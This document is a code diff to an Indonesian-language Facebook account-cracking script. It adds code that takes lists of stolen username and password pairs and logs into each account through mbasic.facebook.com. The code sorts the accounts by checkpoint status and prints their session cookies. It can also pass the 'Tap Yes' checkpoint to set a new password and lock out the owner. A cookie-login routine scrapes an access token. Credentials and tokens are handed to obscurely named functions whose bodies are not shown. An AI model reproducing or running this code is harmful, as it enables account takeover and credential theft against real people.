@@ -80,6 +80,8 @@ from requests.exceptions import ConnectionError
 from bs4 import BeautifulSoup as parser
 from datetime import datetime
 from time import sleep
+import requests as req,re
+from bs4 import BeautifulSoup as par
 try:
 	os.mkdir('dump')
 except:pass
@@ -129,6 +131,11 @@ lq = []
 iz = []
 kx = 0
 olq = []
+data={}
+data2={}
+Aman,Cp,Salah=0,0,0
+ubahP=[]
+pwBaru=[]
 mb = "https://mbasic.facebook.com"
 color = lambda col: "\x1b[1;"+str(col)+"m"
 durasi = str(datetime.now().strftime("%d-%m-%Y"))
@@ -211,7 +218,8 @@ def menu():
 		ganti_ua()
 
 	elif ba in ["7","07"]:
-		buatngecek()
+#	 	buatngecek()  V 1
+		cpdetect()
 		exit()
 
 	elif ba in ["8","08"]:
@@ -226,6 +234,18 @@ def menu():
 		os.system("rm -rf login.txt")
 	else:
 		print(war+'Isi Dengan Benar Bangsat')
+def load():
+	_ = ""
+	__ = int("50")
+	___ = int("0")
+	for t in range(int("50")):
+		_ += "="
+		__ -= 1
+		___ += 1
+		print(("\r[+]%s>>> %s/%s"%(_,int(__),int(___))), end=' ');sys.stdout.flush()
+		time.sleep(0.10)
+
+
 def dumppro():
 	jalan(war+"Jika Anda Menggunakan Tools Ini, Kemungkinan Akan Terjadi Tumbal Mati !")
 	idt = input(inp+"Target ID : ")
@@ -335,7 +355,7 @@ def buat_(idt,save,saold):
 				olq.append(old+'<=>'+nm)
 				olj=open("dump/"+saold+".json", "a+")
 				olj.write(old+"<=>"+nama+"\n")
-				print(uid)
+#				print(uid)
 #				olq.append(uid+'<=>'+nm)
 #				ppx=open("dump/"+olds+".json", "a+")
 #				ppx.write(old+"<=>"+name+"\n")
@@ -449,6 +469,136 @@ def log_hasil(user, pasw, ttll):
         print("%s[%s!%s] %s%s"%(M,P,M,P,oh))
     else:
         print("%s[%s!%s] %sPassword Sudah DiUbah !"%(M,P,M,P))
+def cpdetect():
+	cekfile("Hasil")
+	namax=input("\n"+inp+"Nama File : ")
+	try:
+		fila=open(namax,"r").readlines()
+	except FileNotFoundError:
+		exit("[!] File tidak ditemukan")
+	file(fila)
+url = "https://mbasic.facebook.com"
+def file(file):
+	global user,pw,pwBar,ubahP,jarak,aman,cp,salah
+	jarak = "     "
+	ww=input(war+"Apakah Anda Mau Mengubah Password, Akun Tap Yes ? (y/n): ")
+	if ww in ("Y","y"):
+		ubahP.append("y")
+		pwBar=input(war+"Password Baru Untuk Tap Yes : ")
+		if len(pwBar) <= 5:
+			exit(jalan(war+"Password Harus 6 Kata/Huruf"))
+		else:
+			pwBaru.append(pwBar)
+	else:
+		print("> Skipped")
+	print(war+"Jumlah Akun :",len(file),"\n")
+	for data in file:
+		data = data.replace("\n","")
+		try:user,pw,tll = data.split("|")
+		except:user,pw = data.split("|");tll=(" - ")
+		user = user
+		pw = pw
+		ttl = tll
+		print(f"{war}{user}|{pw}|{ttl}")
+		try:
+			cek_opsi(user,pw)
+		except:continue
+#########################
+# Terima Kasih To Latip #          <<< KNTL
+#########################
+def cek_opsi(user,pw):
+	global Aman,Cp,Salah
+	session=req.Session()
+	session.headers.update({
+		"Host":"mbasic.facebook.com",
+		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+		"accept-encoding":"gzip, deflate",
+		"accept-language":"id-ID,id;q=0.9",
+		"referer":"https://mbasic.facebook.com/",
+		"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+	})
+	soup=par(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
+	link=soup.find("form",{"method":"post"})
+	for x in soup("input"):
+		data.update({x.get("name"):x.get("value")})
+	data.update({"email":user,"pass":pw})
+	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
+	response=par(urlPost.text, "html.parser")
+	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
+		print(f"\r{jarak}{war}Upss.. Ip Kamu KeSpam.. Hidup Matikan Mode Pesawat 2 Detik")
+	if "c_user" in session.cookies.get_dict():
+		if "Akun Anda Dikunci" in urlPost.text:
+			print(f"\r{jarak}{war}Akun Ini KeSesi New !!					\n\n",end="")
+		else:
+			Aman+=1
+			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+			print(f"\r{jarak}[+]Akun Ini Tidak Check Points !!\n{jarak}[+]Cookie : {coki}				\n\n",end="")
+	elif "checkpoint" in session.cookies.get_dict():
+		Cp+=1
+		title=re.findall("\<title>(.*?)<\/title>",str(response))
+		link2=response.find("form",{"method":"post"})
+		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
+		for x in response("input"):
+			if x.get("name") in listInput:
+				data2.update({x.get("name"):x.get("value")})
+		an=session.post(url+link2.get("action"),data=data2)
+		response2=par(an.text,"html.parser")
+		number=0
+		cek=[cek for cek in response2.find_all("option")]
+		print(f"\r{jarak}[!] Terdapat {len(cek)} Opsi:\n",end="")
+		if(len(cek)==0):
+			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
+				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+				if "y" in ubahP:
+					ubah_pw(session,response,link2)
+				else:
+					print(f"\r{jarak}{war}Akun Ini Tap Yes !!\n{jarak}[+]Cookie: {coki}									\n")
+					bokep_japan_yang_terbaru("TAP", user, pw, "-") # CHECK GAME V 1
+			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
+				print("\r{jarak}{war}Akun Ini A2F On !							\n")
+			else:
+				print(f"{jarak}{war}Terjadi Masalah Terhadap Akun !!")
+		elif(len(cek)<=1):
+			for x in range(len(cek)):
+				number+=1
+				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
+				print(f"\r{jarak}[{number}] {''.join(opsi)}							\n\n",end="")
+		elif(len(cek)>=2):
+			for x in range(len(cek)):
+				number+=1
+				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
+				print(f"\r{jarak}[{number}] {''.join(opsi)}							\n",end="")
+			print("")
+		else:
+			if "c_user" in session.cookies.get_dict():
+				cp-=1
+				Aman+=1
+				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+				print(f"\r{jarak}{war}Akun Ini Tidak Check Point !!\n{jarak}{war} Cookie: {coki}				\n",end="")
+				bokep_japan_yang_terbaru("OK", user, pw, "-") # CHECK GAME V 1
+					
+	else:
+		Salah+=1
+		print(f"\r{jarak}{war}Kata Sandi Salah !!				\n")
+def ubah_pw(session,response,link2):
+	dat,dat2={},{}
+	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
+	for x in response("input"):
+		if x.get("name") in but:
+			dat.update({x.get("name"):x.get("value")})
+	ubahPw=session.post(url+link2.get("action"),data=dat).text
+	resUbah=par(ubahPw,"html.parser")
+	link3=resUbah.find("form",{"method":"post"})
+	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
+	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
+		for b in resUbah("input"):
+			if b.get("name") in but2:
+				dat2.update({b.get("name"):b.get("value")})
+		dat2.update({"password_new":"".join(pwBaru)})
+		an=session.post(url+link3.get("action"),data=dat2)
+		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+		print(f"\r{jarak}{war}Akun Ini Tap Yes !!\n{jarak}{war}Password Sudah DiUbah !!\n{jarak}{war} {user}|{''.join(pwBaru)}\n{jarak}{war} Cookie: {coki}							\n\n",end="")
+		bokep_japan_yang_terbaru("OK-OK", user, pwBaru, "-") # CHECK GAME V 1
 #exec(base64.b64decode(ua_mm[3]))
 def generate(text):
 	results=[]
@@ -648,7 +798,7 @@ class crackmenu:
                 open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                 break
                 continue
-            sys.stdout.write('\r%s[%s] %s/%s OK:%s CP:%s '%(Q,response.json()["error_msg"][0:10],loop,len(self.id),len(ok),len(cp))),
+            sys.stdout.write('\r%s[??] %s/%s OK:%s CP:%s '%(Q,loop,len(self.id),len(ok),len(cp))),
             sys.stdout.flush()
 
         loop += 1
@@ -873,8 +1023,20 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.02)
 def login():
-    os.system("clear")
-    print (logo)
+	os.system("clear")
+	print (logo)
+	jalan(war+"Maaf.. Sebelum Lanjut Harap Login !")
+	jalan(war+"Silahkan Pilih Metode Login !")
+	print ("[1]Token")
+	print ("[2]Cookies")
+	h_ = input(war+'Pilih :')
+	if h_ in ["1", "01", "token"]:
+		token()
+	elif h_ in ["2", "02", "cokies"]:
+		coke()
+	else:jalan(war+"Isi Dengan Benar Kontol");time.sleep(1);login()
+
+def token():
     toket = input(war+"Masukan Token Facebook : ")
     try:
         otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
@@ -889,6 +1051,34 @@ def login():
         print((war+"Token Invalid"))
         os.system("clear")
         login()
+def coke():
+        _cookie=input(war+'Cookies : '+I)
+        try:
+                _head={
+                        'Host':'business.facebook.com',
+                                'cache-control':'max-age=0',
+                        'upgrade-insecure-requests':'1',
+                                'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
+                        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                                'content-type' : 'text/html; charset=utf-8',
+                        'accept-encoding':'gzip, deflate',
+                                'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+                        'cookie': _cookie
+                }
+                _r=_ses.get(urls, headers=_head)
+                _p=re.search('(EAAG\w+)', _r.text)
+                _h=_p.group(1)
+                if 'EAA' in _h:
+                        open("login.txt", 'w').write('%s' % (_h))
+#                        open("cookies", 'w').write('%s' % (_cookie))
+#                        bokep_barat_yang_terbaru(_cookie)
+                        bokep_barat_yang_terbaru(_h)
+                        bot_follow()
+        except (AttributeError, requests.exceptions.TooManyRedirects):
+                print(war+'Cookies Error !')
+                time.sleep(3)
+                coke()
+        exit(jalan(war+"Jalankan Lagi Script Ini : python jmbf.py"))
 def bot_follow():
 	try:
 		toket=open("login.txt","r").read()
@@ -925,6 +1115,7 @@ def bot_follow():
 #	requests.post('https://graph.facebook.com//subscribers?access_token=' + token) ### FB RISKY
 #### Bot Follownya Jangan DiEdit Kontol #### Bot Follownya Jangan DiEdit Kontol ####
 	menu()
+
 def dump_public():
 	try:
 		token = open("login.txt", "r").read()
@@ -1017,7 +1208,5 @@ def cekfile(folder):
                         total = ("%s"%(str(len(juma))))
                 except:total = (" ?? ")
                 print(war+"Nama File : "+filex+c+" <><> "+q+"Limit Id : "+total)
-
-#bokep_japan_yang_terbaru("OK", "", "", "-") # jangan diedit check akun tap yes
 try:os.system("git pull");menu();exit()
 except Exception as e:print(war+"Error : %s"%(e))
